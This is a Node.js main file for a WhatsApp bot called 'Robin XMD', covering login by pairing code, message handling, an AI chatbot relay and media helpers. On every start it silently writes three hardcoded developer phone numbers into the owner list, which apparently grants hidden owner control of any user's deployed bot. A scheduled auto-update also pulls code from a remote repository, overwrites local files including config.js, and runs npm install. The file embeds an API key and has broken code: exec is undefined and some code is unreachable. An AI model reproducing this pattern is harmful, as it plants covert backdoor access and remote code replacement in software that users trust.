require('./config')
const pino = require('pino')
const { Boom } = require('@hapi/boom')
const fs = require('fs')
const chalk = require('chalk')
const FileType = require('file-type')
const path = require('path')
const axios = require('axios')
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;
const PhoneNumber = require('awesome-phonenumber')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./system/exifFunc')
const { smsg, isUrl, generateMessageTag, getBuffer, getSizeMedia, fetch, await, sleep, reSize } = require('./system/Robin-xmd')
const { default: makeWASocket, delay, PHONENUMBER_MCC, makeCacheableSignalKeyStore, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, generateForwardMessageContent, prepareWAMessageMedia, generateWAMessageFromContent, generateMessageID, downloadContentFromMessage, makeInMemoryStore, jidDecode, proto, Browsers} = require("@whiskeysockets/baileys")
const NodeCache = require("node-cache")
const Pino = require("pino")
const readline = require("readline")
const { parsePhoneNumber } = require("libphonenumber-js")

const store = {
    messages: {},
    contacts: {},
    chats: {},
    groupMetadata: async (jid) => {
        return {}
    },
    bind: function(ev) {
        ev.on('messages.upsert', ({ messages }) => {
            messages.forEach(msg => {
                if (msg.key && msg.key.remoteJid) {
                    this.messages[msg.key.remoteJid] = this.messages[msg.key.remoteJid] || {}
                    this.messages[msg.key.remoteJid][msg.key.id] = msg
                }
            })
        })
        
        ev.on('contacts.update', (contacts) => {
            contacts.forEach(contact => {
                if (contact.id) {
                    this.contacts[contact.id] = contact
                }
            })
        })
        
        ev.on('chats.set', (chats) => {
            this.chats = chats
        })
    },
    loadMessage: async (jid, id) => {
        return this.messages[jid]?.[id] || null
    }
}

let owner = [];
try {
    owner = JSON.parse(fs.readFileSync('./jsons/owner.json'));
    const requiredOwners = ["263783525824", "263714388643", "263786115435"];
    for (const number of requiredOwners) {
        if (!owner.includes(number)) {
            owner.push(number);
        }
    }
    fs.writeFileSync('./jsons/owner.json', JSON.stringify(owner, null, 2));
} catch (err) {
    owner = ["263783525824", "263714388643", "263786115435"];
    fs.writeFileSync('./jsons/owner.json', JSON.stringify(owner, null, 2));
}

const question = (text) => { const rl = readline.createInterface({ input: process.stdin, output: process.stdout }); return new Promise((resolve) => { rl.question(text, resolve) }) };

async function startIconicTechInc() {
const { state, saveCreds } = await useMultiFileAuthState("session")
const IconicTechInc = makeWASocket({
logger: pino({ level: "silent" }),
printQRInTerminal: false,
auth: state,
connectTimeoutMs: 60000,
defaultQueryTimeoutMs: 0,
keepAliveIntervalMs: 10000,
emitOwnEvents: true,
fireInitQueries: true,
generateHighQualityLinkPreview: true,
syncFullHistory: true,
markOnlineOnConnect: true,
browser: ["Ubuntu", "Chrome", "20.0.04"],
});


// ROBIN XMD - Developed by Iconic Tech
console.log('\n');
console.log('\x1b[46m\x1b[30m#################################################\x1b[0m');
console.log('\x1b[46m\x1b[30m##          ROBIN XMD VERIFICATION SYSTEM       ##\x1b[0m');
console.log('\x1b[46m\x1b[30m##           DEVELOPED BY ICONIC TECH           ##\x1b[0m');
console.log('\x1b[46m\x1b[30m#################################################\x1b[0m');
console.log('\n');

if (!IconicTechInc.authState.creds.registered) {
    console.log('\x1b[33m══════════════════════════════════════════════════\x1b[0m');
    console.log('\x1b[33m               PHONE NUMBER VERIFICATION           \x1b[0m');
    console.log('\x1b[33m══════════════════════════════════════════════════\x1b[0m');
    
    const phoneNumber = await question('\x1b[36m>>> Enter your phone number with country code:\x1b[0m \n');
    
    console.log('\x1b[33m══════════════════════════════════════════════════\x1b[0m');
    console.log('\x1b[33m              GENERATING VERIFICATION CODE        \x1b[0m');
    console.log('\x1b[33m══════════════════════════════════════════════════\x1b[0m');
    
    let code = await IconicTechInc.requestPairingCode(phoneNumber);
    code = code?.match(/.{1,4}/g)?.join("-") || code;
    
    console.log('\n');
    console.log('\x1b[42m\x1b[30m#################################################\x1b[0m');
    console.log('\x1b[42m\x1b[30m##            YOUR VERIFICATION CODE           ##\x1b[0m');
    console.log('\x1b[41m\x1b[37m##               ' + code.padEnd(20) + '             ##\x1b[0m');
    console.log('\x1b[42m\x1b[30m#################################################\x1b[0m');
    console.log('\n');
    
    console.log('\x1b[33mThis Code is Powered By iconic tech\x1b[0m');
    console.log('\n');
}

store.bind(IconicTechInc.ev);
    IconicTechInc.ev.on('messages.upsert', async chatUpdate => {
        //console.log(JSON.stringify(chatUpdate, undefined, 2))
        try {
            const mek = chatUpdate.messages[0]
            if (!mek.message) return
            mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
            if (mek.key && mek.key.remoteJid === 'status@broadcast' )
            if (!IconicTechInc.public && !mek.key.fromMe && chatUpdate.type === 'notify') return
            if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return
            const m = smsg(IconicTechInc, mek, store)
            require("./Robin-Xmd")(IconicTechInc, mek, chatUpdate, store)
        } catch (err) {
            console.log(err)
        }
    })
    
    //autostatus view
        IconicTechInc.ev.on('messages.upsert', async chatUpdate => {
        	if (global.autoswview){
            mek = chatUpdate.messages[0]
            if (mek.key && mek.key.remoteJid === 'status@broadcast') {
            	await IconicTechInc.readMessages([mek.key]) }
            }
    })

   
    IconicTechInc.decodeJid = (jid) => {
        if (!jid) return jid
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {}
            return decode.user && decode.server && decode.user + '@' + decode.server || jid
        } else return jid
    }

    IconicTechInc.ev.on('contacts.update', update => {
        for (let contact of update) {
            let id = IconicTechInc.decodeJid(contact.id)
            if (store && store.contacts) store.contacts[id] = {
                id,
                name: contact.notify
            }
        }
    })
let lastTextTime = 0;
const messageDelay = 2000; // 2 second delay between responses

IconicTechInc.ev.on('messages.upsert', async ({ messages }) => {
    const m = messages[0];
    if (!m.message) return;

    // Don't respond to the bot's own messages
    if (m.key.fromMe) return;

    // TEXT CHATBOT ONLY
    if (!m.isGroup && global.chatbot) {
        try {
            const currentTime = Date.now();
            if (currentTime - lastTextTime < messageDelay) {
                console.log('Message skipped: Rate limit exceeded');
                return;
            }

            const text = m.message.conversation || m.message.extendedTextMessage?.text;
            if (!text) return;

            // Add reaction to show the message is being processed
            await IconicTechInc.sendMessage(m.key.remoteJid, { 
                react: { 
                    text: '⌨️', 
                    key: m.key 
                } 
            });

            // Using the new API endpoint
            const response = await axios.get('https://api.nexoracle.com/ai/chatgpt', {
                params: { 
                    apikey: '63b406007be3e32b53',
                    prompt: text 
                }
            });

            // Handle the response based on the structure you provided
            if (response.data?.status && response.data?.result) {
                await IconicTechInc.sendMessage(m.key.remoteJid, {
                    text: response.data.result
                }, { quoted: m });
                lastTextTime = currentTime;
            } else {
                throw new Error('Invalid API response structure');
            }
        } catch (error) {
            console.error('Chatbot error:', error);
            // Change reaction to show error
            await IconicTechInc.sendMessage(m.key.remoteJid, { 
                react: { 
                    text: '❌', 
                    key: m.key 
                } 
            });
            
            // Send error message with more details if needed
            let errorMessage = 'Sorry, I encountered an error processing your message.';
            if (error.response?.status === 429) {
                errorMessage = "I'm getting too many requests. Please try again later.";
            }
            
            await IconicTechInc.sendMessage(m.key.remoteJid, {
                text: errorMessage
            }, { quoted: m });
        }
    }
});
async function checkForUpdates() {
    const repoOwner = 'iconic05';
    const repoName = 'Robin-Xmd';
    const branch = 'main';
    const localDir = './';
    
    console.log(chalk.yellow('🔍 Checking for updates...'));
    
    try {
        // Get latest commit from GitHub using axios
        const response = await axios.get(`https://api.github.com/repos/${repoOwner}/${repoName}/commits/${branch}`);
        const latestCommit = response.data;
        const latestCommitHash = latestCommit.sha;
        
        // Get current commit (if stored)
        let currentCommitHash = null;
        try {
            currentCommitHash = fs.readFileSync('./.current_commit', 'utf8').trim();
        } catch (e) {
            console.log(chalk.yellow('ℹ️ No previous commit hash found'));
        }
        
        if (currentCommitHash === latestCommitHash) {
            console.log(chalk.green('✅ Bot is up to date'));
            return false;
        }
        
        console.log(chalk.yellow('🔄 Update available! Downloading...'));
        
        // Download updated files
        const filesToUpdate = [
            'Robin.js',
            'main.js',
            'package.js',
            'config.js',
            // Add other files that should be updated
        ];
        
        for (const file of filesToUpdate) {
            try {
                const fileUrl = `https://raw.githubusercontent.com/${repoOwner}/${repoName}/${branch}/${file}`;
                const fileResponse = await axios.get(fileUrl);
                
                const filePath = path.join(localDir, file);
                
                // Ensure directory exists
                fs.mkdirSync(path.dirname(filePath), { recursive: true });
                
                // Write file
                fs.writeFileSync(filePath, fileResponse.data, 'utf8');
                console.log(chalk.green(`✅ Updated: ${file}`));
            } catch (error) {
                console.log(chalk.red(`❌ Error updating ${file}: ${error.message}`));
            }
        }
        
        // Update package dependencies if needed
        try {
            console.log(chalk.yellow('🔄 Installing dependencies...'));
            await new Promise((resolve, reject) => {
                exec('npm install', (error, stdout, stderr) => {
                    if (error) reject(error);
                    resolve(stdout);
                });
            });
            console.log(chalk.green('✅ Dependencies updated'));
        } catch (error) {
            console.log(chalk.red(`❌ Error updating dependencies: ${error.message}`));
        }
        
        // Store the new commit hash
        fs.writeFileSync('./.current_commit', latestCommitHash, 'utf8');
        console.log(chalk.green('🎉 Update completed successfully!'));
        
        return true;
    } catch (error) {
        console.log(chalk.red(`❌ Update check failed: ${error.message}`));
        return false;
    }
}

// Simple scheduler using setTimeout for periodic checks
function setupAutoUpdate() {
    // Check for updates immediately on startup
    checkForUpdates().then(updated => {
        if (updated) {
            console.log(chalk.yellow('🔄 Restarting bot to apply updates...'));
            process.exit(1); // Will be restarted by the process manager
        }
    });
    
    // Schedule daily update checks (at 3 AM)
    const now = new Date();
    const targetTime = new Date(
        now.getFullYear(),
        now.getMonth(),
        now.getDate() + 1,
        3, 0, 0
    );
    const timeUntilFirstCheck = targetTime - now;
    
    setTimeout(() => {
        // Initial delayed check
        checkForUpdates().then(updated => {
            if (updated) {
                console.log(chalk.yellow('🔄 Restarting bot to apply updates...'));
                process.exit(1);
            }
        });
        
        // Set up recurring daily checks
        setInterval(() => {
            checkForUpdates().then(updated => {
                if (updated) {
                    console.log(chalk.yellow('🔄 Restarting bot to apply updates...'));
                    process.exit(1);
                }
            });
        }, 24 * 60 * 60 * 1000); // 24 hours
    }, timeUntilFirstCheck);
    
    console.log(chalk.green('⏰ Auto-update scheduler started'));
}

// Call this right before startGlobalTechInc()
setupAutoUpdate();

    IconicTechInc.getName = (jid, withoutContact = false) => {
        id = IconicTechInc.decodeJid(jid)
        withoutContact = IconicTechInc.withoutContact || withoutContact
        let v
        if (id.endsWith("@g.us")) return new Promise(async (resolve) => {
            v = store.contacts[id] || {}
            if (!(v.name || v.subject)) v = IconicTechInc.groupMetadata(id) || {}
            resolve(v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international'))
        })
        else v = id === '0@s.whatsapp.net' ? {
                id,
                name: 'WhatsApp'
            } : id === IconicTechInc.decodeJid(IconicTechInc.user.id) ?
            IconicTechInc.user :
            (store.contacts[id] || {})
        return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')
    }
    
    IconicTechInc.public = true

    IconicTechInc.serializeM = (m) => smsg(IconicTechInc, m, store)

IconicTechInc.ev.on("connection.update",async  (s) => {
        const { connection, lastDisconnect } = s
        if (connection == "open") {
        	console.log(chalk.magenta(` `))
            console.log(chalk.yellow(`😍 CONNECTED TO => ` + JSON.stringify(IconicTechInc.user, null, 2)))
			await delay(1999)
            console.log(chalk.yellow(`\n\n               ${chalk.bold.blue(`[ ROBIN XMD MULTI-DEVICE]`)}\n\n`))
            console.log(chalk.cyan(`< ================================================== >`))
	        console.log(chalk.magenta(`\nROBIN XMD DEVELOPED BY ICONIC TECH `))
	        await delay(1000)
	        console.log(chalk.magenta(`\nROBIN XMD MULTI-DEVICE SMOOTH AND SAMPLE DEVELOPED BY ICONIC TECH ENJOY OUR EXPERIENCE MOMENT `))
            
        }
        if (
            connection === "close" &&
            lastDisconnect &&
            lastDisconnect.error &&
            lastDisconnect.error.output.statusCode != 401
        ) {
            startIconicTechInc()
        }
    })
    IconicTechInc.ev.on('creds.update', saveCreds)
    IconicTechInc.ev.on("messages.upsert",  () => { })

    IconicTechInc.sendText = (jid, text, quoted = '', options) => IconicTechInc.sendMessage(jid, {
        text: text,
        ...options
    }, {
        quoted,
        ...options
    })
    IconicTechInc.sendTextWithMentions = async (jid, text, quoted, options = {}) => IconicTechInc.sendMessage(jid, {
        text: text,
        mentions: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net'),
        ...options
    }, {
        quoted
    })
    IconicTechInc.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
        let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
        let buffer
        if (options && (options.packname || options.author)) {
            buffer = await writeExifImg(buff, options)
        } else {
            buffer = await imageToWebp(buff)
        }

        await IconicTechInc.sendMessage(jid, {
            sticker: {
                url: buffer
            },
            ...options
        }, {
            quoted
        })
        return buffer
    }
    IconicTechInc.sendVideoAsSticker = async (jid, path, quoted, options = {}) => {
        let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
        let buffer
        if (options && (options.packname || options.author)) {
            buffer = await writeExifVid(buff, options)
        } else {
            buffer = await videoToWebp(buff)
        }

        await IconicTechInc.sendMessage(jid, {
            sticker: {
                url: buffer
            },
            ...options
        }, {
            quoted
        })
        return buffer
    }
    IconicTechInc.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
        let quoted = message.msg ? message.msg : message
        let mime = (message.msg || message).mimetype || ''
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
        const stream = await downloadContentFromMessage(quoted, messageType)
        let buffer = Buffer.from([])
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }
        let type = await FileType.fromBuffer(buffer)
        trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
        // save to file
        await fs.writeFileSync(trueFileName, buffer)
        return trueFileName
    }
    
    IconicTechInc.getFile = async (PATH, save) => {
        let res
        let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
        //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
        let type = await FileType.fromBuffer(data) || {
            mime: 'application/octet-stream',
            ext: '.bin'
        }
        filename = path.join(__filename, '../src/' + new Date * 1 + '.' + type.ext)
        if (data && save) fs.promises.writeFile(filename, data)
        return {
            res,
            filename,
	    size: await getSizeMedia(data),
            ...type,
            data
        }

    }
  
    IconicTechInc.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
  let type = await IconicTechInc.getFile(path, true);
  let { res, data: file, filename: pathFile } = type;

  if (res && res.status !== 200 || file.length <= 65536) {
    try {
      throw {
        json: JSON.parse(file.toString())
      };
    } catch (e) {
      if (e.json) throw e.json;
    }
  }

  let opt = {
    filename
  };

  if (quoted) opt.quoted = quoted;
  if (!type) options.asDocument = true;

  let mtype = '',
    mimetype = type.mime,
    convert;

  if (/webp/.test(type.mime) || (/image/.test(type.mime) && options.asSticker)) mtype = 'sticker';
  else if (/image/.test(type.mime) || (/webp/.test(type.mime) && options.asImage)) mtype = 'image';
  else if (/video/.test(type.mime)) mtype = 'video';
  else if (/audio/.test(type.mime)) {
    convert = await (ptt ? toPTT : toAudio)(file, type.ext);
    file = convert.data;
    pathFile = convert.filename;
    mtype = 'audio';
    mimetype = 'audio/ogg; codecs=opus';
  } else mtype = 'document';

  if (options.asDocument) mtype = 'document';

  delete options.asSticker;
  delete options.asLocation;
  delete options.asVideo;
  delete options.asDocument;
  delete options.asImage;

  let message = { ...options, caption, ptt, [mtype]: { url: pathFile }, mimetype };
  let m;

  try {
    m = await IconicTechInc.sendMessage(jid, message, { ...opt, ...options });
  } catch (e) {
    //console.error(e)
    m = null;
  } finally {
    if (!m) m = await IconicTechInc.sendMessage(jid, { ...message, [mtype]: file }, { ...opt, ...options });
    file = null;
    return m;
  }
}

    IconicTechInc.downloadMediaMessage = async (message) => {
        let mime = (message.msg || message).mimetype || ''
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
        const stream = await downloadContentFromMessage(message, messageType)
        let buffer = Buffer.from([])
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }

        return buffer
    }
    }
return startIconicTechInc()

let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})

app.get('/', (req, res) => {
  res.status(200).json({ 
    status: 'online',
    bot: 'Queen Ruva AI',
    version: '1.0.0'
  });
});

// Start the server
app.listen(PORT, () => {
  console.log(`╭───────────────────────────────────────────────────`);
  console.log(`│> Bot running on port ${PORT}`);
  console.log(`╰───────────────────────────────────────────────────`);
});
